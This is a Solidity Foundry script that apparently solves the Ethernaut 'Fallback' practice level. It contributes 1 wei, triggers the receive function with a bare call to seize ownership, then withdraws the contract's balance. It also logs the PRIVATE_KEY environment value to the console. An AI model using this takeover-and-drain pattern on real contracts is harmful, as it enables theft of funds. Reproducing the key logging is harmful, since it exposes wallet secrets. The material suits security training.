// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Fallback.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FallbackSolution is Script {

  Fallback public fallbackinstance = Fallback(payable(0x78AC11fDa5bd257700c655309A60bb0eedf42B6A));

    function run() external {

      uint256 deployer=vm.envUint("PRIVATE_KEY");
        console.log(deployer);
       vm.startBroadcast(deployer);

        
      fallbackinstance.contribute {value: 1 wei} ();
      address(fallbackinstance).call{value:1 wei}("");
      console.log("new owner",fallbackinstance.owner());
      console.log("my address",vm.envAddress("MY_ADDRESS"));
      fallbackinstance.withdraw();

       vm.stopBroadcast();
    }


}